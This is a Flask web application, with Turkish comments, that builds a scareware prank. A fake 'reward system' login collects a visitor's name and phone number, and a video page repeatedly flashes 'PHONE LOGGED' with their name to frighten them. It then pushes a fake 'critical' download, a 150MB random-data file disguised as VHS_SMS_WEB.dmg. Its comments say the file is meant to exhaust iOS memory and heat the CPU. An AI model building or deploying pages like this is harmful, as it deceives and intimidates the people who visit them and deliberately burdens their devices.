from flask import Flask, render_template_string, request, send_file, session
import os
import io

app = Flask(__name__)
app.secret_key = os.urandom(24)

# 1. GİRİŞ PANELİ
GIRIS_PANELI_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .panel { border: 1px solid #333; padding: 40px; text-align: center; width: 90%; max-width: 400px; }
        h1 { font-size: 1.2em; letter-spacing: 4px; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; margin-bottom: 10px; background: #000; border: 1px solid #444; color: #fff; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 15px; background: #fff; color: #000; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="panel">
        <h1>SOETHG COMPANY</h1>
        <p>MERHABA SAYIN, ODUL SISTEMINE ERISIM ICIN KIMLIK DOGRULAYIN.</p>
        <form method="POST" action="/video">
            <input type="text" name="username" placeholder="KULLANICI ADI" required>
            <input type="text" name="phone_number" placeholder="TELEFON (ISTEGE BAGLI)">
            <button type="submit">SISTEME GIRIS YAP</button>
        </form>
    </div>
</body>
</html>
"""

# 2. VİDEO PANELİ (SAFARI OTO-OYNATMA GARANTİLİ)
VIDEO_PANELI_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; margin: 0; overflow: hidden; height: 100vh; }
        #player { width: 100vw; height: 100vh; }
        #overlay { 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            display: none; justify-content: center; align-items: center;
            z-index: 100; background: #fff; color: #000;
        }
        .msg { font-family: sans-serif; font-weight: 900; font-size: 2.5em; text-align: center; }
        .flash-anim { animation: flash 0.3s infinite; }
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div id="player"></div>
    <div id="overlay"><div class="msg" id="msgText"></div></div>

    <script src="https://www.youtube.com/iframe_api"></script>
    <script>
        var player;
        var username = "{{ username }}";

        function onYouTubeIframeAPIReady() {
            player = new YT.Player('player', {
                videoId: '-NajkeXVSnQ',
                playerVars: { 
                    'autoplay': 1, 'controls': 0, 'mute': 1, // Safari icin sessiz baslatma sart
                    'modestbranding': 1, 'rel': 0, 'playsinline': 1 
                },
                events: { 'onReady': onPlayerReady }
            });
        }

        function onPlayerReady(event) {
            event.target.playVideo();
            // Kullanici ekrana ilk dokundugunda sesi ac (Apple zorunlulugu)
            document.body.addEventListener('click', () => { player.unMute(); }, {once: true});
            
            // 2 Dakikada bir parlama (120000ms)
            setInterval(triggerLogEffect, 120000);
        }

        function triggerLogEffect() {
            const overlay = document.getElementById('overlay');
            const msgText = document.getElementById('msgText');
            msgText.innerHTML = "***** PHONE L-O-G-G-E-D<br>***** " + username;
            overlay.style.display = 'flex';
            overlay.classList.add('flash-anim');
            setTimeout(() => { 
                overlay.style.display = 'none'; 
                overlay.classList.remove('flash-anim');
            }, 5000);
        }

        // Video bitince veya 4 dk sonra indirme
        setTimeout(() => { window.location.href = "/download"; }, 280000);
    </script>
</body>
</html>
"""

# 3. İNDİRME SAYFASI VE KASMA DOSYASI
@app.route('/')
def index(): return render_template_string(GIRIS_PANELI_HTML)

@app.route('/video', methods=['POST'])
def video():
    user = request.form.get('username', 'MECHUL').upper()
    session['username'] = user
    return render_template_string(VIDEO_PANELI_HTML, username=user)

@app.route('/download')
def download():
    return """<body style="background:#000;color:red;text-align:center;padding-top:100px;font-family:sans-serif;">
              <h1>KRITIK PROTOKOL</h1><p>VHS_SMS_WEB PAKETINI ONAYLAYIN.</p>
              <a href="/file"><button style="padding:20px;background:red;color:#fff;border:none;width:80%;font-weight:bold;">DOSYAYI INDIR</button></a></body>"""

@app.route('/file')
def file():
    # iOS Cihazlarda RAM ve Files uygulamasini yormak icin 150MB'lik random paket
    # Sıkıştırılamayan veri gönderiyoruz ki CPU bunu işlerken ısınsın.
    output = io.BytesIO()
    output.write(os.urandom(150 * 1024 * 1024)) 
    output.seek(0)
    return send_file(output, as_attachment=True, download_name="VHS_SMS_WEB.dmg") # DMG veya EXE iOS'u dürtükler.
